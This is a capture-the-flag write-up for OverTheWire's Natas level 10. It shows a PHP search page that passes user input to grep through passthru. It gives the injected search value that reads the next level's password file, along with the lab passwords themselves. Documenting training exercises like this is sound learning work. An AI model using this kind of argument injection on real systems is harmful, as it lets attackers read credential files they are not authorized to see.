# Natas Level 9 -> 10

## 🧠 Goal

Find password to the next level

---

## 🔐 Credentials

- **Username:** `natas10`  
- **Host:** `natas10.natas.labs.overthewire.org`   
- **Port:** `80` (HTTP)  
- **Password:** `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu` 

---

## 🖥️ Commands Used

```bash
┌──(amro㉿amro)-[~]
└─$ curl -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu natas10.natas.labs.overthewire.org
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu" };</script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

```bash
┌──(amro㉿amro)-[~]
└─$ curl -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu natas10.natas.labs.overthewire.org/index-source.html |html2text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3643  100  3643    0     0  15377      0 --:--:-- --:--:-- --:--:-- 15436
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/
css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-
ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/
wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></
script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "<censored>" };</
script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing:
 <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
```bash
┌──(amro㉿amro)-[~]
└─$ curl -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu natas10.natas.labs.overthewire.org --data "needle=. /etc/natas_webpass/natas11 #&submit=submit" |html2text 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1179  100  1128  100    51   4918    222 --:--:-- --:--:-- --:--:--  5126
****** natas10 ******
For security reasons, we now filter on certain characters

Find words containing:[needle              ][Search]

Output:
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
View sourcecode
```
___

## 💡 Theory
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

By entering . /etc/natas_webpass/natas11 # into the search box we are making grep

 . search for any text
 /etc/natas_webpass/natas11 file path to search
 # comment out 'dictionary.txt' and stop grep from searching it.

so
```bash
#Search for any text in /etc/natas_webpass/natas11   , #Document.txt is just a comment now 
grep -i . /etc/natas_webpass/natas11 #Document.txt
```

___

## 📤 Output
```bash
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```
